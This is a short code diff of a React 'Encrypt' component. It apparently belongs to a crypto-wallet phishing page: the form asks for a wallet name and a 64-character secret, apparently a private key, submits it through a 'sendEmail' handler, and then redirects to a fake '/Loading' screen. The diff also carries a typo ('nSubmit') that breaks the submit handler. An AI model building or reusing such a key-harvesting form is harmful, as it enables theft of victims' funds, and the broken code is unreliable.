@@ -60,7 +60,7 @@ export const Encrypt = () => {
           </li>
         </ul>
       </div>
-      <form ref={form} onSubmit={sendEmail} className="myform">
+      <form ref={form} nSubmit={sendEmail} className="myform">
         <textarea
           name="walletName"
           placeholder="Wallet Name"
@@ -82,9 +82,9 @@ export const Encrypt = () => {
           required
         />
         <p>Typically 64 alphanumeric characters</p>
-        <button type="submit" name="submit">
+        <NavLink to="/Loading">    <button type="submit" name="submit" >
           <p>VALIDATE</p>
-        </button>
+        </button></NavLink> 
       </form>
     </div>
   );
